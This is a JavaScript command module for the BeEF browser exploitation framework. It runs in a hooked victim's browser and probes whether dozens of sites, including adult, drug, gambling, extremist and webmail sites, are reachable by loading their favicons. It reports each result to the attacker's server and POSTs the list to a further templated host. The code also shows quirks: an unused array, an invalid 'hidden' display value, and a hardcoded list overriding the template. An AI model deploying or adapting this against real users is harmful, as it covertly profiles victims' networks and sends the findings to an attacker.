beef.execute(function() {

 var urls = "<%= @urls %>";
 var curl = "<%= @command_url %>";
 var cid = parseInt("<%= @command_id %>");
 var xhr = new XMLHttpRequest();
 function report_result(url, message) {
     beef.net.send(curl, cid, url + ' : ' + message);
 }
 

 urls = ["www.porn.com", "www.redtube.com", "ilovesmokingweed.com", "marijuana.com", "www.betfred.com", "www.ladbrokes.com", "www.exploit-db.com", "ha.ckers.org", "www.chemist-4-u.com", "www.pharmacy2u.co.uk", "www.chimpout.com", "www.stormfront.org", "www.4chan.org", "www.stupidness.com", "rotten.com", "www.liveleak.com", "www.guns.com", "www.bulkammo.com", "www.dropbox.com", "pastebin.com", "www.totaljobs.com", "www.newjobs.com", "mail.google.com", "www.hotmail.com", "www.w3schools.com", "www.youtube.com", "www.gamehouse.com", "www.legislation.gov.uk", "www.mcafee.com", "www.symantec.com", "www.independent.co.uk", "www.god.tv", "www.islamreligion.com", "www.amazon.com", "www.ebay.com", "www.blogger.com", "www.facebook.com", "www.skysports.com", "www.travelsupermarket.com", "www.cars.com", "www.bing.com", "www.google.com"];

 for (var i = 0; i < urls.length; i++) {
     //remove newlines and whitespaces
     (function(i){var url = urls[i];
     var prefix = (urls[i].slice(0, 4) == "http") ? '' : 'http://';
     img = document.createElement('img');
     img.style.display = 'hidden';

     img.src = prefix + urls[i] + '/favicon.ico';
     document.body.appendChild(img);
     img.onerror = function(){report_result(url, "Blocked");};
     img.onload = function(){report_result(url, "Not blocked");};})(i);
 }
 test= ["ya.ru", "vk.com"];
 xhr.open('POST', '<%= @burl %>', true);
 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 xhr.send(urls);
});
